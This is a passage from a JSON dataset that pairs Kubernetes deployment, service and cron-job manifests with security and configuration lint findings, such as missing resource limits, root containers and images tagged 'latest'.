volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cloudsql-proxy\" has cpu request 0"
  },
  {
    "id": "2064",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cloudsql-proxy\" has memory limit 0"
  },
  {
    "id": "2065",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"study-builder\" has memory limit 0"
  },
  {
    "id": "2066",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"pod-identity-webhook\" is using an invalid container image, \"IMAGE\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2067",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pod-identity-webhook\" does not have a read-only root file system"
  },
  {
    "id": "2068",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"pod-identity-webhook\" not found"
  },
  {
    "id": "2069",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pod-identity-webhook\" is not set to runAsNonRoot"
  },
  {
    "id": "2070",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pod-identity-webhook\" has cpu request 0"
  },
  {
    "id": "2071",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pod-identity-webhook\" has memory limit 0"
  },
  {
    "id": "2072",
    "manifest_path": "data/manifests/the_stack_sample/sample_0494.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: default\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20200529-d374280316\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"branchprotector\" does not have a read-only root file system"
  },
  {
    "id": "2073",
    "manifest_path": "data/manifests/the_stack_sample/sample_0494.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: default\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20200529-d374280316\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"branchprotector\" is not set to runAsNonRoot"
  },
  {
    "id": "2074",
    "manifest_path": "data/manifests/the_stack_sample/sample_0494.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: default\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20200529-d374280316\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"branchprotector\" has cpu request 0"
  },
  {
    "id": "2075",
    "manifest_path": "data/manifests/the_stack_sample/sample_0494.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: default\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20200529-d374280316\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"branchprotector\" has memory limit 0"
  },
  {
    "id": "2076",
    "manifest_path": "data/manifests/the_stack_sample/sample_0495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: gitea-db\n  labels:\n    service: gitea-db\nspec:\n  ports:\n  - name: postgres\n    protocol: TCP\n    port: 5432\n    targetPort: 5432\n  selector:\n    service: gitea-db\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:gitea-db])"
  },
  {
    "id": "2077",
    "manifest_path": "data/manifests/the_stack_sample/sample_0497.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mlrborowskiaccount\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n  selector:\n    app: mlrborowskiaccount\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mlrborowskiaccount])"
  },
  {
    "id": "2078",
    "manifest_path": "data/manifests/the_stack_sample/sample_0498.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: myservice\n  labels:\n    app: pods-and-services\nspec:\n  selector:\n    app: pods-and-services\n  ports:\n  - port: 80\n    targetPort: 80\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:pods-and-services])"
  },
  {
    "id": "2079",
    "manifest_path": "data/manifests/the_stack_sample/sample_0499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sample-app\n  name: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      labels:\n        app: sample-app\n        fluent-pvc-operator.tech.zozo.com/fluent-pvc-name: fluent-pvc-operator-example-log-collection\n    spec:\n      containers:\n      - name: sample-app\n        image: fluent-pvc-operator-sample-app:development\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        env:\n        - name: BENCHMARK_LOGGING_MAX_LOG_COUNT\n          value: '10000'\n        - name: BENCHMARK_LOGGING_INTERVAL_MILLIS\n          value: '1000'\n        - name: BENCHMARK_LOGGING_EVENT_NAME\n          value: test-event\n        - name: BENCHMARK_LOGGING_PAYLOAD_KEY1\n          value: myKey1\n        - name: BENCHMARK_LOGGING_PAYLOAD_VALUE1\n          value: myValue1\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2080",
    "manifest_path": "data/manifests/the_stack_sample/sample_0499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sample-app\n  name: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      labels:\n        app: sample-app\n        fluent-pvc-operator.tech.zozo.com/fluent-pvc-name: fluent-pvc-operator-example-log-collection\n    spec:\n      containers:\n      - name: sample-app\n        image: fluent-pvc-operator-sample-app:development\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        env:\n        - name: BENCHMARK_LOGGING_MAX_LOG_COUNT\n          value: '10000'\n        - name: BENCHMARK_LOGGING_INTERVAL_MILLIS\n          value: '1000'\n        - name: BENCHMARK_LOGGING_EVENT_NAME\n          value: test-event\n        - name: BENCHMARK_LOGGING_PAYLOAD_KEY1\n          value: myKey1\n        - name: BENCHMARK_LOGGING_PAYLOAD_VALUE1\n          value: myValue1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sample-app\" does not have a read-only root file system"
  },
  {
    "id": "2081",
    "manifest_path": "data/manifests/the_stack_sample/sample_0499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sample-app\n  name: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      labels:\n        app: sample-app\n        fluent-pvc-operator.tech.zozo.com/fluent-pvc-name: fluent-pvc-operator-example-log-collection\n    spec:\n      containers:\n      - name: sample-app\n        image: fluent-pvc-operator-sample-app:development\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        env:\n        - name: BENCHMARK_LOGGING_MAX_LOG_COUNT\n          value: '10000'\n        - name: BENCHMARK_LOGGING_INTERVAL_MILLIS\n          value: '1000'\n        - name: BENCHMARK_LOGGING_EVENT_NAME\n          value: test-event\n        - name: BENCHMARK_LOGGING_PAYLOAD_KEY1\n          value: myKey1\n        - name: BENCHMARK_LOGGING_PAYLOAD_VALUE1\n          value: myValue1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sample-app\" is not set to runAsNonRoot"
  },
  {
    "id": "2082",
    "manifest_path": "data/manifests/the_stack_sample/sample_0499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sample-app\n  name: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      labels:\n        app: sample-app\n        fluent-pvc-operator.tech.zozo.com/fluent-pvc-name: fluent-pvc-operator-example-log-collection\n    spec:\n      containers:\n      - name: sample-app\n        image: fluent-pvc-operator-sample-app:development\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        env:\n        - name: BENCHMARK_LOGGING_MAX_LOG_COUNT\n          value: '10000'\n        - name: BENCHMARK_LOGGING_INTERVAL_MILLIS\n          value: '1000'\n        - name: BENCHMARK_LOGGING_EVENT_NAME\n          value: test-event\n        - name: BENCHMARK_LOGGING_PAYLOAD_KEY1\n          value: myKey1\n        - name: BENCHMARK_LOGGING_PAYLOAD_VALUE1\n          value: myValue1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sample-app\" has cpu request 0"
  },
  {
    "id": "2083",
    "manifest_path": "data/manifests/the_stack_sample/sample_0505.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2084",
    "manifest_path": "data/manifests/the_stack_sample/sample_0505.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myjavaapp-container\" does not have a read-only root file system"
  },
  {
    "id": "2085",
    "manifest_path": "data/manifests/the_stack_sample/sample_0505.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myjavaapp-container\" is not set to runAsNonRoot"
  },
  {
    "id": "2086",
    "manifest_path": "data/manifests/the_stack_sample/sample_0505.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myjavaapp-container\" has cpu request 0"
  },
  {
    "id": "2087",
    "manifest_path": "data/manifests/the_stack_sample/sample_0505.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myjavaapp-container\" has memory limit 0"
  },
  {
    "id": "2088",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hvpa-manager\" is using an invalid container image, \"ggaurav10/hvpa-controller:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2089",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hvpa-manager\" does not have a read-only root file system"
  },
  {
    "id": "2090",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hvpa-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "2091",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hvpa-manager\" has cpu request 0"
  },
  {
    "id": "2092",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
